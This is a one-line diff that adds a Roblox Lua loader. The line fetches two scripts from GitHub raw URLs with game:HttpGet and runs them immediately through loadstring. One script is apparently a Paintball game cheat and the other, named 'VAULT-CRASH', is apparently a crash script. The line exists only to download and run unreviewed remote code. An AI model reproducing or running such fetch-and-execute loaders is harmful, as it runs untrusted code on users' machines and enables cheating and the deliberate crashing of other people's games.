@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LucasggkX/Games/refs/heads/main/Paintball.lua"))(), loadstring(game:HttpGet("https://raw.githubusercontent.com/yNopaak/VAULT-CRASH/refs/heads/main/README.md"))()//
